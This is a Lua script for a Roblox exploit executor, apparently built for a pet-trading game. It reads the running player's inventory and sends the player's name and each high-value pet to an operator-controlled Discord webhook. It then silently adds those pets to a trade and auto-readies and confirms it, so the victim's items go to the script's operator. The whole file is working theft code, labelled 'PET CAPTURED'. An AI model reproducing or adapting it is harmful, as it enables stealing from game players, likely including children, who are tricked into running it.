-- [[ 2. ANDROID-STABLE WEBHOOK ]] --
local function SendLog(title, pet, val)
    local payload = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = "User: **" .. LocalPlayer.Name .. "**",
            ["fields"] = {
                {["name"] = "Pet", ["value"] = pet, ["inline"] = true},
                {["name"] = "Value", ["value"] = tostring(val), ["inline"] = true}
            },
            ["color"] = 0x00FF00
        }}
    })
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        task.spawn(function()
            pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
        end)
    end
end

-- [[ 3. "FAST" INVENTORY & TRADE ]] --
task.spawn(function()
    task.wait(3) -- Reduced delay for "Fast" build
    SendLog("🚀 FAST BUILD ACTIVE", "Ready", 0)

    pcall(function()
        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
        local inventory = ClientData.get_data().inventory
        local petPath = inventory and (inventory.inventory_pets or inventory.pets)
        
        if petPath then
            local TradeAPI = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
            
            for _, pet in pairs(petPath) do
                local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
                if val >= (getgenv().THRESHOLD or 0) then
                    -- 1. Log to Discord
                    SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
                    
                    -- 2. Force Add to Trade
                    task.spawn(function()
                        TradeAPI:WaitForChild("AddItemToTrade"):FireServer(pet.unique)
                    end)
                end
            end
            
            -- 3. Auto-Accept Trade
            task.wait(1)
            TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
            task.wait(0.5)
            TradeAPI:WaitForChild("ConfirmTrade"):FireServer()
        end
    end)
end)
